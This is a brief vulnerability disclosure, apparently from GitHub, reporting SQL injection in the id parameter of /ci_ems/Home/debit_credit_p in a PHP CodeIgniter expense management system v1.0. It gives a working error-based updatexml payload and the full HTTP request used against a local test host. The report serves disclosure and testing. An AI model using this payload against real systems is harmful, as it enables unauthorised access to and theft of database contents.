# php-codeigniter-expense-management-system v1.0 has SQL injection

vendors: https://www.sourcecodester.com/php-codeigniter-expense-management-system-source-code

Date: 2022-07-24

Vulnerability File: /ci_ems/Home/debit_credit_p

Vulnerability location: /ci_ems/Home/debit_credit_p?id=18, id

[+] Payload: id=18'+and++updatexml(1,concat(0x7e,(select+database()),0x7e),0)--+

Tested on Windows 10, XAMPP

```
GET /ci_ems/Home/debit_credit_p?id=18'+and++updatexml(1,concat(0x7e,(select+database()),0x7e),0)--+ HTTP/1.1
Host: 172.20.10.13
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://172.20.10.13/ci_ems/Home/view_clients
Cookie: PHPSESSID=hs2g51l1gmlikit3icuq6kf4an; ci_session=a7e1tk4u5ih48n1d88etb314b7gv37qn
Upgrade-Insecure-Requests: 1


```

![](https://github.com/mikeccltt/0724/blob/main/ci_ems/sql.gif?raw=true)

